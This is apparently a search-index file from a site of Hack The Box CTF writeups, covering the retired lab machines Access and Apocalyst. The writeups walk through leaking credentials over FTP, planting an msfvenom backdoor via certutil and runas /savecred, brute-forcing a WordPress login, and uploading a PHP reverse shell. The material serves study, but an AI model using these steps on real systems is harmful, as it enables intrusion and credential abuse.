{"config":{"lang":["en"],"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"","text":"Getting Started This website is a compilation of writeups for the website- https://www.hackthebox.eu/ . I hope to organize solutions to help people and myself study CTF's. By using Markdown (.md) files, this page is much more readable on portable devices. Contributors Thanks to all the content writers on their respective blogs https://medium.com/@ranakhalil101/ https://medium.com/@jonathanchelmus/ https://medium.com/@yashanand155 https://medium.com/@swedgwood https://medium.com/@hussaini.faisal https://medium.com/@aditya12anand https://medium.com/@0katz/ https://medium.com/@barpoet https://www.hackingarticles.in/ https://medium.com/@georgeomnet https://medium.com/@sif0 https://medium.com/@sdgeek https://medium.com/@preethambomma If I miss your name here, please tell me! Motivation I built this website since I wanted a single place for CTF writeups and something easy to read on mobile devices. The template has been derived from here . Therefore, if any adjustment is needed or you have the same motivation to contribute to this work, please don't hesitate to give me your feedback. You can press the \"pencil icon\" in the upper right corner to edit the content or open an issue in my repository . Your solution will be rebased to this repository after I review it and make some form modifications to your pull request. I hope this place is uful for everyone ## How I Generate the Website? I use the static site generator MkDocs and the beautiful theme Material for MkDocs to build this website. As for rendering math equations, I use KaTeX , which is fast and beautiful. I also add overflow-x: auto to prevent the overflow issue on small screen devices so that you can scroll horizontally in the math display equations. Revised on May 08 2020. License Licensed under the MIT License.","title":"Preface"},{"location":"#getting-started","text":"This website is a compilation of writeups for the website- https://www.hackthebox.eu/ . I hope to organize solutions to help people and myself study CTF's. By using Markdown (.md) files, this page is much more readable on portable devices.","title":"Getting Started"},{"location":"#contributors","text":"Thanks to all the content writers on their respective blogs https://medium.com/@ranakhalil101/ https://medium.com/@jonathanchelmus/ https://medium.com/@yashanand155 https://medium.com/@swedgwood https://medium.com/@hussaini.faisal https://medium.com/@aditya12anand https://medium.com/@0katz/ https://medium.com/@barpoet https://www.hackingarticles.in/ https://medium.com/@georgeomnet https://medium.com/@sif0 https://medium.com/@sdgeek https://medium.com/@preethambomma If I miss your name here, please tell me!","title":"Contributors"},{"location":"#motivation","text":"I built this website since I wanted a single place for CTF writeups and something easy to read on mobile devices. The template has been derived from here . Therefore, if any adjustment is needed or you have the same motivation to contribute to this work, please don't hesitate to give me your feedback. You can press the \"pencil icon\" in the upper right corner to edit the content or open an issue in my repository . Your solution will be rebased to this repository after I review it and make some form modifications to your pull request. I hope this place is uful for everyone ## How I Generate the Website? I use the static site generator MkDocs and the beautiful theme Material for MkDocs to build this website. As for rendering math equations, I use KaTeX , which is fast and beautiful. I also add overflow-x: auto to prevent the overflow issue on small screen devices so that you can scroll horizontally in the math display equations. Revised on May 08 2020.","title":"Motivation"},{"location":"#license","text":"Licensed under the MIT License.","title":"License"},{"location":"Retired/Access Writeup/","text":"Hello Guys , I am Faisal Husaini and this is my writeup on Medium for Access machine which has retired. My username on HTB is ***\u201cfaisalelino\u201d . The IP for this box is 10.10.10.98, so let\u2019s get started NMAP Results We see that 3 Ports are open , Port 21 , 23 and 80. , I didn\u2019t got much interesting from the Port 80 running http service. So I went to check for Port 21 which is FTPD. Although from Port 80 we came to know that this box is either Windows 7 or Windows Server 2008 R2. Port 21 \u2014 FTP We try to login to FTP using the default ftp command in linux following with the IP of the box. Also using the \u201canonymous\u201d username login with blank password. We successfully logged through the ftp and now let\u2019s see what does it contains. We use the \u201c dir \u201d command to list files and directories in ftp We see two directories , let\u2019s check both of them respectively. In the Backup directory, we see a file named backup.mdb , so we get the file using the \u201c get \u201d ftp command which downloads the file to our host machine. Remember to download the file in binary mode like I did above Let\u2019s check the contents of the other directory \u201c Engineer \u201d We got both the files , let\u2019s examine the file. Examining The Files We see that the backup.mdb is a Microsoft Access Database and \u201cAccess Control.zip\u201d is a password protected zip file. So I copied these files to my Windows 10 machine and opened the \u201cAccess Control.zip\u201d file using Winrar and saw it is password protected , so I went for the backup.mdb file using Microsoft Access 2007 We see there was a entry named \u201cauth_user\u201d which contained some username and password. We used these password to connect through Telnet and all of these entries failed , but when I see the username engineer , I came to remember that there was a Folder named \u201cEngineer\u201d which contained the \u201cAccess Control.zip\u201d file , maybe this password is for the zip file , so we used this password and bingo it was the password for the zip file. The Zip File contained a file named \u201cAccess Control.pst\u201d, which is a Outlook file. So I opened it through a PST File Viewer on Windows and see an email like below. It says the password for the \u201csecurity\u201d account has been changed to \u201c 4Cc3ssC0ntr0ller \u201d. Let\u2019s try these credentials to connect through the Telnet as from the NMAP Scan we saw Port 23 for Telnet was Open. Connecting Through Telnet We connect to Telnet using the \u201c telnet \u201d command on Linux Bingo!!! We got connected as \u201c security \u201d user , let\u2019s get the user flag. User Flag The user flag on Windows boxes on HTB is usually stored in the Desktop folder of the user. Here is the User Flag , now we go for the privelege escalation. Privelege Escalation So as we are on the box , we try some commands on it to see what we get , first we check whether the box has any Stored Credentials We use the command \u201ccmdkey /list\u201d for checking it We see that the Administrator account has a saved credentials on this machine. After searching on google about how to use , we came to know about the \u201c runas \u201d command. From this command , we can run any program as the Administrator account , so let\u2019s create a backdoor from msfvenom and then transfer it on the box. We created our backdoor named as \u201cbackdoor.exe\u201d , now we will transfer this to the Windows box. While I was trying powershell to get this file on the box. I was facing alot of problems , so I used \u201c certutil \u201d to transfer the file. Command Used \u2192 certutil -urlcache -split -f We see that the backdoor was successfully uploaded to the box as backdoor.exe and we also confirmed that by using dir command. Now we trigger this backdoor as Administrator using the savecreds on this box and also with the \u201c runas \u201d command. But first we setup our listener on msfconsole . All set with listener , now we use \u201crunas\u201d to run the backdoor.exe program as Administrator and get back reverse shell. Command Used \u2192 runas /savecred /noprofile /user:ACCESS\\Administrator backdoor.exe As soon as we run the command on the box , we get a meterpreter shell back , let\u2019s now dig into it. We see that now we have access to the administrator account. Let\u2019s now get the root flag , which is usually located on the Desktop folder of any particular user on Windows boxes in HTB. Bingo , we got the root flag. Some Interesting Stuff As you saw we got the root flag , however , there was a bit tricky thing on this box , let me show you. We go back to our meterpreter and get NT Authority\\System using the meterpreter \u201c getsystem \u201d command and then try to get the flag. As you can see that now we are NT Authority\\System using the getsystem command on meterpreter. Now let\u2019s try to read the root flag. As you can see that it returns Access is denied , even though we have high privileges. As the root flag had ownership of the Administrator account , we couldn\u2019t read it as NT Authority\\System. P.S \u2192 I was not able to read the root flag as ACCESS\\Administrator too at the beginning , then after resetting the box , it was fine. Vulnerabilities Used To Solve This Box Low Level Priveleges \u2192 Telnet Password Leakage in the Access File which we got from FTP using anonymous login Admin Level Priveleges \u2192 Stored Credentials References Runas - Run under a different user account - Windows CMD - SS64.com Syntax RUNAS [ [/noprofile | /profile][/env] [/savecred | /netonly] ] / user: UserName program RUNAS [ [/noprofile | /profile][/env] [/savecred] ] / smartcard [/user: UserName] program Display the trust levels that can be used: RUNAS/showtrustlevels Run a program at a given TrustLevel: RUNAS / trustlevel: TrustLevel program Key /noprofile Do not load the user's profile. certutil Certutil.exe is a command-line program that is installed as part of Certificate Services. You can use Certutil.exe to dump and display certification authority (CA) configuration information, configure Certificate Services, backup and restore CA components, and verify certificates, key pairs, and certificate chains.","title":"1. Access Writeup.md"},{"location":"Retired/Access Writeup/#nmap-results","text":"We see that 3 Ports are open , Port 21 , 23 and 80. , I didn\u2019t got much interesting from the Port 80 running http service. So I went to check for Port 21 which is FTPD. Although from Port 80 we came to know that this box is either Windows 7 or Windows Server 2008 R2.","title":"NMAP Results"},{"location":"Retired/Access Writeup/#port-21-ftp","text":"We try to login to FTP using the default ftp command in linux following with the IP of the box. Also using the \u201canonymous\u201d username login with blank password. We successfully logged through the ftp and now let\u2019s see what does it contains. We use the \u201c dir \u201d command to list files and directories in ftp We see two directories , let\u2019s check both of them respectively. In the Backup directory, we see a file named backup.mdb , so we get the file using the \u201c get \u201d ftp command which downloads the file to our host machine. Remember to download the file in binary mode like I did above Let\u2019s check the contents of the other directory \u201c Engineer \u201d We got both the files , let\u2019s examine the file.","title":"Port 21 \u2014 FTP"},{"location":"Retired/Access Writeup/#examining-the-files","text":"We see that the backup.mdb is a Microsoft Access Database and \u201cAccess Control.zip\u201d is a password protected zip file. So I copied these files to my Windows 10 machine and opened the \u201cAccess Control.zip\u201d file using Winrar and saw it is password protected , so I went for the backup.mdb file using Microsoft Access 2007 We see there was a entry named \u201cauth_user\u201d which contained some username and password. We used these password to connect through Telnet and all of these entries failed , but when I see the username engineer , I came to remember that there was a Folder named \u201cEngineer\u201d which contained the \u201cAccess Control.zip\u201d file , maybe this password is for the zip file , so we used this password and bingo it was the password for the zip file. The Zip File contained a file named \u201cAccess Control.pst\u201d, which is a Outlook file. So I opened it through a PST File Viewer on Windows and see an email like below. It says the password for the \u201csecurity\u201d account has been changed to \u201c 4Cc3ssC0ntr0ller \u201d. Let\u2019s try these credentials to connect through the Telnet as from the NMAP Scan we saw Port 23 for Telnet was Open.","title":"Examining The Files"},{"location":"Retired/Access Writeup/#connecting-through-telnet","text":"We connect to Telnet using the \u201c telnet \u201d command on Linux Bingo!!! We got connected as \u201c security \u201d user , let\u2019s get the user flag. User Flag The user flag on Windows boxes on HTB is usually stored in the Desktop folder of the user. Here is the User Flag , now we go for the privelege escalation.","title":"Connecting Through Telnet"},{"location":"Retired/Access Writeup/#privelege-escalation","text":"So as we are on the box , we try some commands on it to see what we get , first we check whether the box has any Stored Credentials We use the command \u201ccmdkey /list\u201d for checking it We see that the Administrator account has a saved credentials on this machine. After searching on google about how to use , we came to know about the \u201c runas \u201d command. From this command , we can run any program as the Administrator account , so let\u2019s create a backdoor from msfvenom and then transfer it on the box. We created our backdoor named as \u201cbackdoor.exe\u201d , now we will transfer this to the Windows box. While I was trying powershell to get this file on the box. I was facing alot of problems , so I used \u201c certutil \u201d to transfer the file. Command Used \u2192 certutil -urlcache -split -f We see that the backdoor was successfully uploaded to the box as backdoor.exe and we also confirmed that by using dir command. Now we trigger this backdoor as Administrator using the savecreds on this box and also with the \u201c runas \u201d command. But first we setup our listener on msfconsole . All set with listener , now we use \u201crunas\u201d to run the backdoor.exe program as Administrator and get back reverse shell. Command Used \u2192 runas /savecred /noprofile /user:ACCESS\\Administrator backdoor.exe As soon as we run the command on the box , we get a meterpreter shell back , let\u2019s now dig into it. We see that now we have access to the administrator account. Let\u2019s now get the root flag , which is usually located on the Desktop folder of any particular user on Windows boxes in HTB. Bingo , we got the root flag.","title":"Privelege Escalation"},{"location":"Retired/Access Writeup/#some-interesting-stuff","text":"As you saw we got the root flag , however , there was a bit tricky thing on this box , let me show you. We go back to our meterpreter and get NT Authority\\System using the meterpreter \u201c getsystem \u201d command and then try to get the flag. As you can see that now we are NT Authority\\System using the getsystem command on meterpreter. Now let\u2019s try to read the root flag. As you can see that it returns Access is denied , even though we have high privileges. As the root flag had ownership of the Administrator account , we couldn\u2019t read it as NT Authority\\System. P.S \u2192 I was not able to read the root flag as ACCESS\\Administrator too at the beginning , then after resetting the box , it was fine.","title":"Some Interesting Stuff"},{"location":"Retired/Access Writeup/#vulnerabilities-used-to-solve-this-box","text":"Low Level Priveleges \u2192 Telnet Password Leakage in the Access File which we got from FTP using anonymous login Admin Level Priveleges \u2192 Stored Credentials","title":"Vulnerabilities Used To Solve This Box"},{"location":"Retired/Access Writeup/#references","text":"Runas - Run under a different user account - Windows CMD - SS64.com Syntax RUNAS [ [/noprofile | /profile][/env] [/savecred | /netonly] ] / user: UserName program RUNAS [ [/noprofile | /profile][/env] [/savecred] ] / smartcard [/user: UserName] program Display the trust levels that can be used: RUNAS/showtrustlevels Run a program at a given TrustLevel: RUNAS / trustlevel: TrustLevel program Key /noprofile Do not load the user's profile. certutil Certutil.exe is a command-line program that is installed as part of Certificate Services. You can use Certutil.exe to dump and display certification authority (CA) configuration information, configure Certificate Services, backup and restore CA components, and verify certificates, key pairs, and certificate chains.","title":"References"},{"location":"Retired/Apocalyst Writeup/","text":"Host: 10.10.10.46 root@kali:~# nmap -T4 -A -v 10.10.10.46 Starting Nmap 7.40 ( [https://nmap.org](https://nmap.org) ) at 2017\u201311\u201323 17:01 EST NSE: Loaded 143 scripts for scanning. NSE: Script Pre-scanning. Initiating NSE at 17:01 Completed NSE at 17:01, 0.00s elapsed Initiating NSE at 17:01 Completed NSE at 17:01, 0.00s elapsed Initiating Ping Scan at 17:01 Scanning 10.10.10.46 [4 ports] Completed Ping Scan at 17:01, 0.14s elapsed (1 total hosts) Initiating SYN Stealth Scan at 17:01 Scanning apocalyst.htb (10.10.10.46) [1000 ports] Discovered open port 22/tcp on 10.10.10.46 Discovered open port 80/tcp on 10.10.10.46 Completed SYN Stealth Scan at 17:01, 1.85s elapsed (1000 total ports) Initiating Service scan at 17:01 Scanning 2 services on apocalyst.htb (10.10.10.46) Completed Service scan at 17:01, 6.44s elapsed (2 services on 1 host) Initiating OS detection (try #1) against apocalyst.htb (10.10.10.46) Retrying OS detection (try #2) against apocalyst.htb (10.10.10.46) Retrying OS detection (try #3) against apocalyst.htb (10.10.10.46) Retrying OS detection (try #4) against apocalyst.htb (10.10.10.46) Retrying OS detection (try #5) against apocalyst.htb (10.10.10.46) Initiating Traceroute at 17:01 Completed Traceroute at 17:01, 0.19s elapsed Initiating Parallel DNS resolution of 2 hosts. at 17:01 Completed Parallel DNS resolution of 2 hosts. at 17:01, 0.00s elapsed NSE: Script scanning 10.10.10.46. Initiating NSE at 17:01 Completed NSE at 17:01, 6.17s elapsed Initiating NSE at 17:01 Completed NSE at 17:01, 0.00s elapsed Nmap scan report for apocalyst.htb (10.10.10.46) Host is up (0.13s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 fd:ab:0f:c9:22:d5:f4:8f:7a:0a:29:11:b4:04:da:c9 (RSA) |_ 256 76:92:39:0a:57:bd:f0:03:26:78:c7:db:1a:66:a5:bc (ECDSA) 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-generator: WordPress 4.8 | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Apocalypse Preparation Blog No exact OS matches for host (If you know what OS is running on it, see [https://nmap.org/submit/](https://nmap.org/submit/) ). When we access the web-server this is what we see For some reason the formatting of the Wordpress website is screwed up, so I added the default domain name of the box apocalyst.htb to the /etc/hosts and that fixed the formatting issue. The next step in my reconnaissance phase would be to scan for known directories names and files using Dirbuster with the Dirbuster medium dictionary. I didn\u2019t let Dirbuster to fully run because it found 100 folders and 80 files very quickly and\u2026 that\u2019s way too many folders and files to go over in a CTF, so I just scanned only for folders instead but still couldn\u2019t find anything interesting\u2026 I created my own custom wordlist with Cewl. cewl 10.10.10.46 Desktop/custom_dict.txt When we run our custom wordlist with dirbuster again we can see that all requests have a response size of 421 except one that has a size 440. which means it has different content than all of the other requests or there\u2019s an abnormal error. When look at the source code of the folder with the 440 response size, we can see an interesting comment. !doctype html html lang=\u201den\u201d head meta charset=\u201dutf-8 title End of the world /title /head body img src=\u201dimage.jpg\u201d ! \u2014 needle \u2192 /body /html ! \u2014 needle \u2014 maybe it\u2019s a metaphor for a needle in a hay stack? So stenography maybe? When we go to the folder were brought to an apocalyptic image. I saved it and checked for strings but there was no interesting strings in the metadata of the image. I used steghide to check for embedded data. root@kali:~/Downloads# steghide info image.jpg \u201cimage.jpg\u201d: format: jpeg capacity: 13.0 KB Try to get information about embedded data ? (y/n) y Enter passphrase: embedded file \u201clist.txt\u201d: size: 3.6 KB encrypted: rijndael-128, cbc compressed: yes as you can see it does in fact have an embedded file named list.txt encrypted in rijndael-1128 Let\u2019s extract the file root@kali:~/Downloads# steghide extract -sf image.jpg Enter passphrase: wrote extracted data to \u201clist.txt\u201d. The file had no pass-phrase I just hit enter and it worked. Now we get another words-list\u2026 I didn\u2019t know what to do with this list at the moment so I moved on to enumerating Wordpress with wpscan root@kali:~/Downloads# wpscan \u2014 url [http://10.10.10.46](http://10.10.10.46) --enumerate u _______________________________________________________________ __ _______ _____ \\ \\ / / __ \\ / ____| \\ \\ /\\ / /| |__) | (___ ___ __ _ _ __ \u00ae \\ \\/ \\/ / | ___/ \\___ \\ / __|/ _` | \u2018_ \\ \\ /\\ / | | ____) | (__| (_| | | | | \\/ \\/ |_| |_____/ \\___|\\__,_|_| |_| WordPress Security Scanner by the WPScan Team Version 2.9.3 Sponsored by Sucuri \u2014 [https://sucuri.net](https://sucuri.net) @_WPScan_, @ethicalhack3r, @erwan_lr, pvdl, @_FireFart_ _______________________________________________________________ [i] It seems like you have not updated the database for some time. [?] Do you want to update now? [Y]es [N]o [A]bort, default: [N]Y [i] Updating the Database \u2026 [i] Update completed. [+] URL: [http://10.10.10.46/](http://10.10.10.46/) [+] Started: Thu Nov 23 17:51:06 2017 [!] The WordPress \u2018[http://10.10.10.46/readme.html ](http://10.10.10.46/readme.html ) file exists exposing a version number [+] Interesting header: LINK: [http://apocalyst.htb/?rest_route=/ ;](http://apocalyst.htb/?rest_route=/ ;) rel=\u201d[https://api.w.org/ ](https://api.w.org/) [+] Interesting header: SERVER: Apache/2.4.18 (Ubuntu) [+] XML-RPC Interface available under: [http://10.10.10.46/xmlrpc.php](http://10.10.10.46/xmlrpc.php) [!] Upload directory has directory listing enabled: [http://10.10.10.46/wp-content/uploads/](http://10.10.10.46/wp-content/uploads/) [!] Includes directory has directory listing enabled: [http://10.10.10.46/wp-includes/](http://10.10.10.46/wp-includes/) [+] WordPress version 4.8 (Released on 2017\u201306\u201308) identified from advanced fingerprinting, meta generator, links opml, stylesheets numbers [!] 8 vulnerabilities identified from the version number [!] Title: WordPress 2.3.0\u20134.8.1 \u2014 $wpdb- prepare() potential SQL Injection Reference: [https://wpvulndb.com/vulnerabilities/8905](https://wpvulndb.com/vulnerabilities/8905) Reference: [https://wordpress.org/news/2017/09/wordpress-4-8-2-security-and-maintenance-release/](https://wordpress.org/news/2017/09/wordpress-4-8-2-security-and-maintenance-release/) Reference: [https://github.com/WordPress/WordPress/commit/70b21279098fc973eae803693c0705a548128e48](https://github.com/WordPress/WordPress/commit/70b21279098fc973eae803693c0705a548128e48) Reference: [https://github.com/WordPress/WordPress/commit/fc930d3daed1c3acef010d04acc2c5de93cd18ec](https://github.com/WordPress/WordPress/commit/fc930d3daed1c3acef010d04acc2c5de93cd18ec) [i] Fixed in: 4.8.2 [!] Title: WordPress 2.9.2\u20134.8.1 \u2014 Open Redirect Reference: [https://wpvulndb.com/vulnerabilities/8910](https://wpvulndb.com/vulnerabilities/8910) Reference: [https://wordpress.org/news/2017/09/wordpress-4-8-2-security-and-maintenance-release/](https://wordpress.org/news/2017/09/wordpress-4-8-2-security-and-maintenance-release/) Reference: [https://core.trac.wordpress.org/changeset/41398](https://core.trac.wordpress.org/changeset/41398) Reference: [https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-14725](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-14725) [i] Fixed in: 4.8.2 [!] Title: WordPress 3.0\u20134.8.1 \u2014 Path Traversal in Unzipping Reference: [https://wpvulndb.com/vulnerabilities/8911](https://wpvulndb.com/vulnerabilities/8911) Reference: [https://wordpress.org/news/2017/09/wordpress-4-8-2-security-and-maintenance-release/](https://wordpress.org/news/2017/09/wordpress-4-8-2-security-and-maintenance-release/) Reference: [https://core.trac.wordpress.org/changeset/41457](https://core.trac.wordpress.org/changeset/41457) Reference: [https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-14719](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-14719) [i] Fixed in: 4.8.2 [!] Title: WordPress 4.4\u20134.8.1 \u2014 Path Traversal in Customizer Reference: [https://wpvulndb.com/vulnerabilities/8912](https://wpvulndb.com/vulnerabilities/8912) Reference: [https://wordpress.org/news/2017/09/wordpress-4-8-2-security-and-maintenance-release/](https://wordpress.org/news/2017/09/wordpress-4-8-2-security-and-maintenance-release/) Reference: [https://core.trac.wordpress.org/changeset/41397](https://core.trac.wordpress.org/changeset/41397) Reference: [https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-14722](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-14722) [i] Fixed in: 4.8.2 [!] Title: WordPress 4.4\u20134.8.1 \u2014 Cross-Site Scripting (XSS) in oEmbed Reference: [https://wpvulndb.com/vulnerabilities/8913](https://wpvulndb.com/vulnerabilities/8913) Reference: [https://wordpress.org/news/2017/09/wordpress-4-8-2-security-and-maintenance-release/](https://wordpress.org/news/2017/09/wordpress-4-8-2-security-and-maintenance-release/) Reference: [https://core.trac.wordpress.org/changeset/41448](https://core.trac.wordpress.org/changeset/41448) Reference: [https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-14724](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-14724) [i] Fixed in: 4.8.2 [!] Title: WordPress 4.2.3\u20134.8.1 \u2014 Authenticated Cross-Site Scripting (XSS) in Visual Editor Reference: [https://wpvulndb.com/vulnerabilities/8914](https://wpvulndb.com/vulnerabilities/8914) Reference: [https://wordpress.org/news/2017/09/wordpress-4-8-2-security-and-maintenance-release/](https://wordpress.org/news/2017/09/wordpress-4-8-2-security-and-maintenance-release/) Reference: [https://core.trac.wordpress.org/changeset/41395](https://core.trac.wordpress.org/changeset/41395) Reference: [https://blog.sucuri.net/2017/09/stored-cross-site-scripting-vulnerability-in-wordpress-4-8-1.html](https://blog.sucuri.net/2017/09/stored-cross-site-scripting-vulnerability-in-wordpress-4-8-1.html) Reference: [https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-14726](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-14726) [i] Fixed in: 4.8.2 [!] Title: WordPress 2.3\u20134.8.3 \u2014 Host Header Injection in Password Reset Reference: [https://wpvulndb.com/vulnerabilities/8807](https://wpvulndb.com/vulnerabilities/8807) Reference: [https://exploitbox.io/vuln/WordPress-Exploit-4-7-Unauth-Password-Reset-0day-CVE-2017-8295.html](https://exploitbox.io/vuln/WordPress-Exploit-4-7-Unauth-Password-Reset-0day-CVE-2017-8295.html) Reference: [http://blog.dewhurstsecurity.com/2017/05/04/exploitbox-wordpress-security-advisories.html](http://blog.dewhurstsecurity.com/2017/05/04/exploitbox-wordpress-security-advisories.html) Reference: [https://core.trac.wordpress.org/ticket/25239](https://core.trac.wordpress.org/ticket/25239) Reference: [https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-8295](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-8295) [!] Title: WordPress = 4.8.2 \u2014 $wpdb- prepare() Weakness Reference: [https://wpvulndb.com/vulnerabilities/8941](https://wpvulndb.com/vulnerabilities/8941) Reference: [https://wordpress.org/news/2017/10/wordpress-4-8-3-security-release/](https://wordpress.org/news/2017/10/wordpress-4-8-3-security-release/) Reference: [https://github.com/WordPress/WordPress/commit/a2693fd8602e3263b5925b9d799ddd577202167d](https://github.com/WordPress/WordPress/commit/a2693fd8602e3263b5925b9d799ddd577202167d) Reference: [https://twitter.com/ircmaxell/status/923662170092638208](https://twitter.com/ircmaxell/status/923662170092638208) Reference: [https://blog.ircmaxell.com/2017/10/disclosure-wordpress-wpdb-sql-injection-technical.html](https://blog.ircmaxell.com/2017/10/disclosure-wordpress-wpdb-sql-injection-technical.html) Reference: [https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-16510](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-16510) [i] Fixed in: 4.8.3 [+] WordPress theme in use: twentyseventeen \u2014 v1.3 [+] Name: twentyseventeen \u2014 v1.3 | Last updated: 2017\u201311\u201316T00:00:00.000Z | Location: [http://10.10.10.46/wp-content/themes/twentyseventeen/](http://10.10.10.46/wp-content/themes/twentyseventeen/) | Readme: [http://10.10.10.46/wp-content/themes/twentyseventeen/README.txt](http://10.10.10.46/wp-content/themes/twentyseventeen/README.txt) [!] The version is out of date, the latest version is 1.4 | Style URL: [http://10.10.10.46/wp-content/themes/twentyseventeen/style.css](http://10.10.10.46/wp-content/themes/twentyseventeen/style.css) | Referenced style.css: [http://apocalyst.htb/wp-content/themes/twentyseventeen/style.css](http://apocalyst.htb/wp-content/themes/twentyseventeen/style.css) | Theme Name: Twenty Seventeen | Theme URI: [https://wordpress.org/themes/twentyseventeen/](https://wordpress.org/themes/twentyseventeen/) | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a\u2026 | Author: the WordPress team | Author URI: [https://wordpress.org/](https://wordpress.org/) [+] Enumerating plugins from passive detection \u2026 [+] No plugins found [+] Enumerating usernames \u2026 [+] Identified the following 1 user/s: + \u2014 \u2014 + \u2014 \u2014 \u2014 \u2014 \u2014 + \u2014 \u2014 \u2014 \u2014 \u2014 \u2014 \u2014 \u2014 \u2014 \u2014 \u2014 \u2014 \u2014 \u2014 \u2014 \u2014 \u2014 -+ | Id | Login | Name | + \u2014 \u2014 + \u2014 \u2014 \u2014 \u2014 \u2014 + \u2014 \u2014 \u2014 \u2014 \u2014 \u2014 \u2014 \u2014 \u2014 \u2014 \u2014 \u2014 \u2014 \u2014 \u2014 \u2014 \u2014 -+ | 1 | falaraki | falaraki \u2014 Apocalypse Preparation | + \u2014 \u2014 + \u2014 \u2014 \u2014 \u2014 \u2014 + \u2014 \u2014 \u2014 \u2014 \u2014 \u2014 \u2014 \u2014 \u2014 \u2014 \u2014 \u2014 \u2014 \u2014 \u2014 \u2014 \u2014 -+ We can see that wpscan found a bunch of possible vulnerabilities and a user named falaraki. Maybe let\u2019s brute force wordpress with the word-list we got from the image on http://10.10.10.46/wp-login.php I captured a test request in Burp Suite at the login page and sent it over to the intruder option. Were going to select the password pwd parameter only and the Attack type will be Sniper. We move onto to the payloads section and add the list we got from the image. Then start the attack - all requests sent back a 200 status code and most of them had a 3101 in length except this one request that had 3764 in length meaning it either worked as the correct password, timed out, or it gave us a unique error that only that password can give. Let\u2019s try to login with that password Transclisiation username: falaraki password: Transclisiation \u2026and were in! Now we can upload our php reverse shell in the Appearance Editor. I got my php shell from PenTestMonkey I\u2019m not going to paste the entire code here because it\u2019s a lot of code, so all you have to do is change your ip and port number. Where it says //CHANGE THIS to your ip and desired port number. $ip = \u2018127.0.0.1\u2019; // CHANGE THIS $port = 1234; // CHANGE THIS Save the changes made to the file once your reverse shell is in and setup your netcat or metasploit listener. Then execute the php reverse shell. http://apocalyst.htb/wp-content/themes/twentyseventeen/404.php Now we can get the user flag! \u201cOne of my go-to commands after catching a dumb shell is to use Python to spawn a pty. The pty module let\u2019s you spawn a psuedo-terminal that can fool commands like su into thinking they are being executed in a proper terminal. To upgrade a dumb shell, simply run the following command\u201d `python3 -c import pty; pty.spawn( /bin/bash ) ` I uploaded linux-exploit-suggester to the system to check for possible privilege escalation exploits. www-data@apocalyst:/tmp$ ./linux-exploit-suggester.sh ./linux-exploit-suggester.sh Kernel version: 4.4.0 Architecture: x86_64 Distribution: ubuntu Package list: from current OS Possible Exploits: [+] [CVE-2015\u20133290] espfix64_NMI Details: [http://www.openwall.com/lists/oss-security/2015/08/04/8](http://www.openwall.com/lists/oss-security/2015/08/04/8) Download URL: [https://www.exploit-db.com/download/37722](https://www.exploit-db.com/download/37722) [+] [CVE-2016\u20130728] keyring Details: [http://perception-point.io/2016/01/14/analysis-and-exploitation-of-a-linux-kernel-vulnerability-cve-2016-0728/](http://perception-point.io/2016/01/14/analysis-and-exploitation-of-a-linux-kernel-vulnerability-cve-2016-0728/) Download URL: [https://www.exploit-db.com/download/40003](https://www.exploit-db.com/download/40003) Comments: Exploit takes about ~30 minutes to run [+] [CVE-2016\u20132384] usb-midi Details: [https://xairy.github.io/blog/2016/cve-2016-2384](https://xairy.github.io/blog/2016/cve-2016-2384) Tags: ubuntu=14.04,fedora=22 Download URL: [https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2016-2384/poc.c](https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2016-2384/poc.c) Comments: Requires ability to plug in a malicious USB device and to execute a malicious binary as a non-privileged user [+] [N/A] target_offset Details: [https://www.exploit-db.com/exploits/40049/](https://www.exploit-db.com/exploits/40049/) Tags: ubuntu=16.04(kernel:4.4.0\u201321) Download URL: [https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/sploits/40053.zip](https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/sploits/40053.zip) Comments: ip_tables.ko needs to be loaded [+] [CVE-2016\u20134557] double-fdput() Details: [https://bugs.chromium.org/p/project-zero/issues/detail?id=808](https://bugs.chromium.org/p/project-zero/issues/detail?id=808) Tags: ubuntu=16.04(kernel:4.4.0\u201362) Download URL: [https://bugs.chromium.org/p/project-zero/issues/attachment?aid=232552](https://bugs.chromium.org/p/project-zero/issues/attachment?aid=232552) Comments: CONFIG_BPF_SYSCALL needs to be set kernel.unprivileged_bpf_disabled != 1 [+] [CVE-2016\u20135195] dirtycow Details: [https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails](https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails) Tags: RHEL=5|6|7,debian=7|8,ubuntu=16.10|16.04|14.04|12.04 Download URL: [https://www.exploit-db.com/download/40611](https://www.exploit-db.com/download/40611) [+] [CVE-2016\u20135195] dirtycow 2 Details: [https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails](https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails) Tags: RHEL=5|6|7,debian=7|8,ubuntu=16.10|16.04|14.04|12.04 Download URL: [https://www.exploit-db.com/download/40616](https://www.exploit-db.com/download/40616) [+] [CVE-2016\u20138655] chocobo_root Details: [http://www.openwall.com/lists/oss-security/2016/12/06/1](http://www.openwall.com/lists/oss-security/2016/12/06/1) Tags: 